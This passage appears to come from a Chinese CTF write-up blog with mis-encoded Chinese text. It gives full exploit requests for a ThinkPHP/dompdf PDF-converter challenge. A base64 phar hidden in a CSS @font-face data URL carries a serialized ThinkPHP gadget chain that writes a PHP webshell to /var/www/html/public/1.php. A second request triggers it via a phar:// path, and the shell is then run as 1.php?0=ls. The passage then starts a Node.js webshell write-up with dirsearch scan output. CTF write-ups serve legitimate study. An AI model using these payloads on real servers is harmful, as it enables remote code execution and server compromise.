g6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 1 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_da94a27b825aeca64e86b19a3972972d.ttf##&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>å°†====== REQUEST 1 ENCODED =======å…ˆå†™å…¥phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ contentæ˜¯å› ä¸ºå®¡è®¡æºç çš„æ—¶å€™å‘ç°</p><p><img src="../images/image-20230426203507788.png" alt="image-20230426203507788"></p><p><img src="../images/image-20230426203522154.png" alt="image-20230426203522154"></p><p><img src="../images/image-20230426203609835.png" alt="image-20230426203609835"></p><p>çŸ¥é“è¿™äº›ä»¥åï¼Œå°±å¯ä»¥å»å°è¯•postå‚æ•°äº†</p><p><img src="../images/image-20230426203735353.png" alt="image-20230426203735353"></p><p>ç„¶åæ¥ç€postç¬¬äºŒä¸ªå‚æ•°</p><p>è§¦å‘phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è®¿é—®1.php?0=lså°±è¡Œäº†</p><p>å‚è€ƒæ–‡ç«  <a href="https://blog.csdn.net/mochu7777777/article/details/130309288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168251168616800186547875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168251168616800186547875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-130309288-null-null.142^v86^control_2,239^v2^insert_chatgpt&amp;utm_term=pdf_converter_revenge&amp;spm=1018.2226.3001.4187">think PHP pdf rce</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯"><a href="#DAS4-ä½ å¬è¯´è¿‡-js-çš„-webshell-å—çš„è§£é¢˜æ€è·¯" class="headerlink" title="DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—çš„è§£é¢˜æ€è·¯"></a>DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—çš„è§£é¢˜æ€è·¯</h1><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><div class="table-container"><table><thead><tr><th>é¢˜ç›®å</th><th>ç±»å‹</th><th>éš¾åº¦</th></tr></thead><tbody><tr><td>DAS4-ä½ å¬è¯´è¿‡ js çš„ webshell å—</td><td>WEB</td><td>å›°éš¾</td></tr></tbody></table></div><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>DASCTF{test_flag}</li></ul><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ol><li>ä»£ç å®¡è®¡ nodejs</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>nodejs æºä»£ç æ³„æ¼</li><li>coding å…¶ä»– git æ‰˜ç®¡å‡­æ®æ³„æ¼</li></ol><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>æ‰“å¼€ç½‘é¡µ</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854079283-9b8e55a1-6827-42f8-9b80-4041b8bfdffa.png" alt="æˆªå±2022-12-03 23.22.05"></p><p>ç›´æ¥æ‰“å¼€ f12 å‘ç° api ä¸æ³¨é‡Š</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854085904-9310bb97-3f6a-4a2a-9a65-dd99779867a7.png" alt="æˆªå±2022-12-03 23.22.45"></p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>è¿™é‡Œå…¶å®æƒ³è¯´çš„æ˜¯æ‰«æè¯¥ç½‘ç«™ çœ‹çœ‹æœ‰æ²¡æœ‰å‘ç°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://127.0.0.1 <span class="comment"># è¿™é‡Œä¸éœ€è¦å¼•å…¥ä»»ä½•å­—å…¸ æ³„æ¼çš„æ–‡ä»¶ç›¸å½“å¸¸è§</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2.8</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458</span><br><span class="line"></span><br><span class="line">Output File: /tmp/reports/</span><br><span class="line"></span><br><span class="line">Target: http://127.0.0.1/</span><br><span class="line"></span><br><span class="line">[23:23:56] Starting:</span><br><span class="line">[23:23:56] 403 -    9B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:23:56] 403 -    9B  - /%2e%2e//google.com</span><br><span class="line">[23:23:58] 400 -   14B  - 